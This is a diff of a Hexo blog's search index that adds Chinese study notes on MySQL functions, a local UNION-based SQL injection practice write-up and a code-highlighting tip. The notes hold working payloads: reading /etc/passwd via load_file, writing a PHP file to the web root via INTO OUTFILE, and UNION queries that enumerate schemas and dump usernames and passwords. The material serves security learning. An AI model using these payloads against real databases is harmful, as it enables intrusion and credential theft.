@@ -6,6 +6,40 @@
     <content type="text"><![CDATA[]]></content>
   </entry>
   <entry>
+    <title><![CDATA[note22]]></title>
+    <url>%2F2019%2F08%2F13%2Fnote22%2F</url>
+    <content type="text"><![CDATA[Abstract: MYSQL常用函数的讲解 一、常用函数 函数名 作用 version() 返回数据库的版本号 database() 返回当前数据库名 user() 返回当前用户 system_user() 返回当前用户 concat(s1, s2, …, sn)字符串s1，s2等多个字符串合并为一个字符串。 12-- MY SQL FUNCTIONSELECT CONCAT(&quot;MY &quot;, &quot;SQL &quot;, &quot;FUNCTION &quot;); concat_ws(x, s1, s1, …, sn)把字符串合并成一个字符串，两两间以x连接。 12-- I-LOVE-SQLSELECT CONCAT_WS(&quot;-&quot;, &quot;I&quot;, &quot;LOVE&quot;, &quot;SQL&quot;); group_concat(s1, ‘ ‘, s2 )返回一个字符串结果，该结果由分组中的值连接组合而成。 1SELECT GROUP_CONCAT(username, &apos;-&apos;, passwd) FROM `USERS`; left(s, n)返回字符串s前n个字符。 1234-- helloSELECT LEFT(&apos;hello world&apos;, 5);-- helllo wSELECT LEFT(&apos;hello world&apos;, 7); right(s, n)返回字符串s的后n个字符。 12-- o worldSELECT RIGHT(&apos;hello world&apos;, 7); substr/substring(s, start, length) 123456-- o SELECT SUBSTR(&apos;hello world&apos;, 5, 2);SELECT SUBSTRING(&apos;hello world&apos;, 5, 2);-- o woSELECT SUBSTR(&apos;hello world&apos;, 5, 4);SELECT SUBSTRING(&apos;hello world&apos;, 5, 4); mid(s, n, len)从字符串s的start位置截取长度为length的子字符串 12-- o wSELECT MID(&apos;hello world&apos;, 5, 3); DISTINCT 过虑重复的记录 1SELECT DISTINCT name FROM user; UNION操作符用于合并两个或多个SELECT语句的结果集 NOTE: UNION内部的每个SELECT语句必须拥有相同数量的列，列也必须拥有相似的数据类型。UNION在进行表连接后会筛选掉重复的记录，UNION ALL只是简单的将两个结果合并后返回。 1SELECT 字段名 FROM 表1 UNION SELECT 字段名 FROM 表2 ORDER BY在SQL注入中用于判断字段数，然后用UNION用于输出信息。 LIKE 操作符 左右 _ 代表任意单个字符 % 代表任意多字符 12345SELECT id FROM users WHERE &apos;username&apos; LIKE &apos;b%&apos;;SELECT id FROM users WHERE &apos;username&apos; LIKE &apos;%o%&apos;;SELECT id FROM users WHERE &apos;username&apos; LIKE &apos;admi_&apos;;-- 把标题中含有1作者名含有1值含有1的数据列出SELECT * FROM test.content WHERE title LIKE &apos;%1%&apos; or author like &apos;%1%&apos; or value like %1%&apos;&apos; like %q%包含q的 %q q在结尾 q% q在开头 二、读写文件1. 写文件12345-- 绝对路径into dumpfile &quot;filepath&quot;-- 绝对路径into outfile &quot;filepath&quot;select 123 into outfile/dumpfile &apos;/var/www/html/eval.php&apos;; 2. 读文件1234567-- 绝对路径load_file(&apos;filepath&apos;)select load_file(&apos;/etc/passwd&apos;);create table data( data text)insert into data values(load_file(&apos;&apos;)); load file: 读取文件并以字符串形式返回文件内容。 into outfile: 将所选行写入文件，该文件会在服务器主机上进行创建，所以你必须要有执行这条命令的权限，还要注意要写入文件不能是现有的文件。如：/etc/passwd 以下内容不太懂，先记住 文件转十六进制，然后unhexo into dumpfile 本地使用hex(load file(‘path’))处理二进制文件 服务器上，执行select unhex(0x十六进制内容) into dumpfile “/tmp/a.exe”]]></content>
+      <categories>
+        <category>Web Security</category>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[练习7]]></title>
+    <url>%2F2019%2F08%2F13%2Fpractice7%2F</url>
+    <content type="text"><![CDATA[Abstract: 先在数据库中使用UNION写SQL查出数据库版本，库，表，列等信息，再在index.php中操作一遍。 一、首先确定列数1234-- 先用order by根据是否报错确定列数SELECT * FROM users WHERE username=&apos;admin&apos; ORDER BY 4;SELECT * FROM users WHERE username=&apos;admin&apos; ORDER BY 5;SELECT * FROM users WHERE username=&apos;admin&apos; ORDER BY 6; OUT 由输出结果可知，共有五列。 二、读取数据1. 确定库名1SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT version(), (SELECT group_concat(schema_name) FROM information_schema.schemata), 3, 4, 5; OUT 2. 确定表名1SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (select group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;mynews&apos;), 3, 4, 5 limit 1,1; OUT 1SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (select group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;test&apos;), 3, 4, 5 limit 1,1; OUT 对库进行一一查询，找到目标库 3. 列名1SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;content&apos;), 3, 4, 5 limit 1,1; OUT 1SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;users&apos;), 3, 4, 5 limit 1,1; 可以看到有重复的字段，原因是昨天练习数据库导入时，对同一.sql文件导入不同的库，即不同库里存着名为users和content的表。加上限定条件即可。 1SELECT * FROM users WHERE username = &apos;admin&apos; UNION SELECT 1,2,3,4,group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME=&apos;users&apos; AND TABLE_SCHEMA=&apos;test&apos;; OUT 1SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (SELECT group_concat(username, passwd) FROM `test`.`content`), 3, 4,5; OUT 可以利用查到的库名表名字段名，查看对应的信息。 三、网页上练习1. 环境首先把index.php拷贝到工程文件中，用phpstorm打开文件，在Terminal输入 1php -S 127.0.0.1:9000 在浏览器中打开网页http://127.0.0.1:9000/index.php 首页如下： 2. 前期工作index.php显示程序如下： 可知，显示的读取数据的前三个。 在提交按钮输入 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; order by 49; 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; order by 50; 可知字段数为49。 3. 开始查询 查询库名 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT version(), user(), (SELECT group_concat(schema_name) FROM information_schema.schemata),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1 查询表名 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;test&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1 查询字段名 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;content&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1 可以看出来有重复的字段名，这是因为两个不同库里均有content和users表。加上库名的限制就正常了。 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;content&apos; AND table_schema=&apos;test&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;user&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1 查询数据 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT concat_ws(&apos;~&apos;, author, title) FROM `test`.`content` LIMIT 0,1),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(author, &apos;~&apos;,title) FROM`test`.`content`),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1 同理也可查出users数据 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(username, &apos;~&apos;, passwd) FROM `test`.`users`),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1]]></content>
+      <categories>
+        <category>Web Security</category>
+      </categories>
+      <tags>
+        <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[highlight]]></title>
+    <url>%2F2019%2F08%2F13%2Fhighlight%2F</url>
+    <content type="text"><![CDATA[Abstract: 解决markdown代码上传到github上不高亮的问题。 Syntax123&#123;% codeblock [lang:language] [title] [url] [link text] %&#125;code snippet&#123;% endcodeblock %&#125; ExampleJavascript Array SyntaxMDN Documentation12var arr1 = new Array(arrayLength);var arr2 = new Array(element0, element1, ..., elementN); 123456789a='foo';print(a);#python dictionarydict = &#123;'Name': 'Zara', 'Age': 7, 'Class': 'First'&#125;print "dict['Name']: ", dict['Name']print "dict['Age']: ", dict['Age'] 1SELECT column_name FROM information_schema.columns WHERE table_name='content'; 12345678&lt;?php $cars = array("Volvo", "BMW", "Toyota"); echo $cars[0]; //输出"Volvo" echo $cars[1]; //输出"BMW" echo $cars[2]; //输出"Toyota"?&gt; 123dict = &#123;'Name': 'Zara', 'Age': 7, 'Class': 'First'&#125;print "dict['Name']: ", dict['Name']print "dict['Age']: ", dict['Age']]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>issue</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[练习6]]></title>
     <url>%2F2019%2F08%2F12%2Fpractice6%2F</url>
     <content type="text"><![CDATA[Abstract: MySQL中information_schema库的使用 1SELECT schema_name FROM information_schema.schemata; OUT 显示出所有库名。 1SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;mynews&apos;; OUT 显示出mynews库中所有表名。 1SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;test&apos;; OUT 找到目标，发现test库中有两张表content和users。 1SELECT column_name FROM information_schema.columns WHERE table_name=&apos;users&apos;; 显示出users表中的字段。 1SELECT username, passwd FROM test.users; OUT 1SELECT column_name FROM information_schema.columns WHERE table_name=&apos;content&apos;; 显示出content表中的字段。 OUT]]></content>
@@ -25,7 +59,7 @@
         <category>笔记</category>
       </categories>
       <tags>
-        <tag>MYSQL</tag>
+        <tag>MySQL</tag>
       </tags>
   </entry>
   <entry>
